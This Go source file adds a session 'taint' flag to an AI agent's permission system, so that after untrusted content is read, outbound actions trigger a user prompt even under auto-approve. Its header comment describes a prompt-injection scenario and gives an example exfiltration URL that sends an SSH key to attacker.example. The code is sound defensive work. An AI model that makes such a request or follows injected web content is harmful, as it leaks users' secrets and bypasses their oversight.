// GORILLA OVERRIDE: this file did not exist upstream.
//
// The taint bit answers one question: has this conversation just read
// something a stranger could have written?
//
// It matters because every other control in this program protects the SOURCE
// of an action (is this command safe, is this path inside a root). None of
// them protected the SINK. A model that has read a hostile web page and then
// fetches `https://attacker.example/?q=<your ssh key>` is making a request
// that is, considered on its own, completely ordinary. The only thing wrong
// with it is what happened three tool calls earlier.
//
// So: reading untrusted content sets the bit; anything that leaves the machine
// consults it. It does not block — it forces the question to be asked, even in
// auto-approve mode, which is the one place the program had no answer at all.
// Cost: a bool and a mutex. Zero tokens.
package permission

import (
	"sync"
	"time"
)

// TaintReason records what tainted the session and when, so the prompt can
// say WHY it is asking rather than just that it is.
type TaintReason struct {
	Reason string
	At     time.Time
}

var (
	taintMu sync.RWMutex
	tainted = map[string]TaintReason{}
)

// MarkTainted records that untrusted content entered this conversation.
// Safe to call from any tool; keyed on the session tree root so a helper
// session cannot launder content past the conversation that spawned it.
func MarkTainted(sessionID, reason string) {
	if sessionID == "" {
		return
	}
	root := sessionID
	if svc, ok := active.(*permissionService); ok {
		svc.mu.RLock()
		root = svc.rootSession(sessionID)
		svc.mu.RUnlock()
	}
	taintMu.Lock()
	tainted[root] = TaintReason{Reason: reason, At: time.Now()}
	taintMu.Unlock()
}

// TaintOf reports what tainted this session, if anything.
func TaintOf(sessionID string) (TaintReason, bool) {
	if sessionID == "" {
		return TaintReason{}, false
	}
	root := sessionID
	if svc, ok := active.(*permissionService); ok {
		svc.mu.RLock()
		root = svc.rootSession(sessionID)
		svc.mu.RUnlock()
	}
	taintMu.RLock()
	defer taintMu.RUnlock()
	r, ok := tainted[root]
	return r, ok
}

// IsTainted is the predicate the auto-approve carve-out uses.
func IsTainted(sessionID string) bool {
	_, ok := TaintOf(sessionID)
	return ok
}

// ClearTaint is called when a new user turn begins. The user typing is the
// trust boundary: they have seen what happened and are asking for the next
// thing. Carrying taint across turns forever would make the bit useless — it
// would be set permanently after the first web search and the prompts would
// become noise, which is how a control gets switched off.
func ClearTaint(sessionID string) {
	if sessionID == "" {
		return
	}
	root := sessionID
	if svc, ok := active.(*permissionService); ok {
		svc.mu.RLock()
		root = svc.rootSession(sessionID)
		svc.mu.RUnlock()
	}
	taintMu.Lock()
	delete(tainted, root)
	taintMu.Unlock()
}
